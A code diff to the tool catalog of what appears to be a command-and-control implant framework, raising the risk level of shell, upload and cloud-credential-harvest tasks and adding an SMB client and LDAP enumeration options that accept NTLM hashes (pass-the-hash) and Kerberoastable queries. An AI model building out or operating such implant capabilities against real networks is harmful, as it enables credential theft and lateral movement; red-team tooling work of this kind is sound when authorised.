@@ -52,7 +52,7 @@ func Catalog() []ToolDef {
 		{
 			Name:         "run_shell",
 			Description:  "Execute a shell command on the implant",
-			Risk:         "low",
+			Risk:         "high",
 			TaskType:     pb.TaskType_TASK_SHELL,
 			NeedsSession: true,
 			BuildData: func(args map[string]any) ([]byte, error) {
@@ -132,7 +132,7 @@ func Catalog() []ToolDef {
 		{
 			Name:         "file_upload",
 			Description:  "Upload a file to the implant (local_path on operator host; remote_path relative to implant cwd)",
-			Risk:         "low",
+			Risk:         "high",
 			TaskType:     pb.TaskType_TASK_FILE_UPLOAD,
 			NeedsSession: true,
 			BuildData: func(args map[string]any) ([]byte, error) {
@@ -154,7 +154,7 @@ func Catalog() []ToolDef {
 		{
 			Name:         "cloud_harvest",
 			Description:  "Harvest cloud credentials (Azure/AWS/GCP/IMDS) from the implant",
-			Risk:         "low",
+			Risk:         "high",
 			TaskType:     pb.TaskType_TASK_MODULE,
 			ModuleName:   "cloud",
 			NeedsSession: true,
@@ -175,6 +175,15 @@ func Catalog() []ToolDef {
 			},
 		},
 		{
+			Name:         "smb",
+			Description:  "Remote SMB client (action: list_shares|list_dir|download; host, share, path; password or ntlm_hash or anonymous)",
+			Risk:         policy.ModuleRiskLevel("smb"),
+			TaskType:     pb.TaskType_TASK_MODULE,
+			ModuleName:   "smb",
+			NeedsSession: true,
+			BuildData:    buildSMB,
+		},
+		{
 			Name:         "screenshot",
 			Description:  "Capture a screenshot from the implant",
 			Risk:         "low",
@@ -193,7 +202,7 @@ func Catalog() []ToolDef {
 		},
 		{
 			Name:         "socks_start",
-			Description:  "Start SOCKS5 proxy on the implant",
+			Description:  "Enable reverse SOCKS relay for the session (operator connects via teamserver)",
 			Risk:         "low",
 			TaskType:     pb.TaskType_TASK_SOCKS_START,
 			NeedsSession: true,
@@ -217,7 +226,7 @@ func Catalog() []ToolDef {
 		},
 		{
 			Name:         "ldap_enum",
-			Description:  "LDAP/AD enumeration (query_type, domain, target_dc, optional username/password)",
+			Description:  "LDAP/AD enumeration (query_type e.g. kerberoastable|interesting|users|dcs|rbcd, domain, target_dc, optional username/password/ntlm_hash/attributes/custom_filter)",
 			Risk:         policy.RiskLevel(pb.TaskType_TASK_LDAP_ENUM),
 			TaskType:     pb.TaskType_TASK_LDAP_ENUM,
 			NeedsSession: true,
@@ -300,11 +309,20 @@ func RequiresApproval(tool ToolDef) bool {
 
 func buildLDAPEnum(args map[string]any) ([]byte, error) {
 	cfg := &pb.LDAPEnumConfig{
-		QueryType: str(args, "query_type"),
-		Domain:    str(args, "domain"),
-		TargetDc:  str(args, "target_dc"),
-		Username:  str(args, "username"),
-		Password:  str(args, "password"),
+		QueryType:    str(args, "query_type"),
+		Domain:       str(args, "domain"),
+		TargetDc:     str(args, "target_dc"),
+		Username:     str(args, "username"),
+		Password:     str(args, "password"),
+		NtlmHash:     str(args, "ntlm_hash"),
+		CustomFilter: str(args, "custom_filter"),
+	}
+	if v, ok := args["attributes"].([]any); ok {
+		for _, a := range v {
+			if s, ok := a.(string); ok && s != "" {
+				cfg.Attributes = append(cfg.Attributes, s)
+			}
+		}
 	}
 	if cfg.QueryType == "" || cfg.Domain == "" || cfg.TargetDc == "" {
 		return nil, fmt.Errorf("query_type, domain, and target_dc required")
@@ -351,6 +369,33 @@ func buildLateral(args map[string]any) ([]byte, error) {
 		return nil, fmt.Errorf("method and target required")
 	}
 	return proto.Marshal(cfg)
+}
+
+func buildSMB(args map[string]any) ([]byte, error) {
+	cfg := &pb.SMBClientConfig{
+		Action:   str(args, "action"),
+		Host:     str(args, "host"),
+		Share:    str(args, "share"),
+		Path:     str(args, "path"),
+		Domain:   str(args, "domain"),
+		Username: str(args, "username"),
+		Password: str(args, "password"),
+		NtlmHash: str(args, "ntlm_hash"),
+	}
+	if cfg.Action == "" {
+		cfg.Action = "list_shares"
+	}
+	if cfg.Host == "" {
+		return nil, fmt.Errorf("host required")
+	}
+	if v, ok := args["anonymous"].(bool); ok {
+		cfg.Anonymous = v
+	}
+	inner, err := proto.Marshal(cfg)
+	if err != nil {
+		return nil, err
+	}
+	return proto.Marshal(&pb.ModuleTask{ModuleName: "smb", Config: inner})
 }
 
 func buildPersist(args map[string]any) ([]byte, error) {
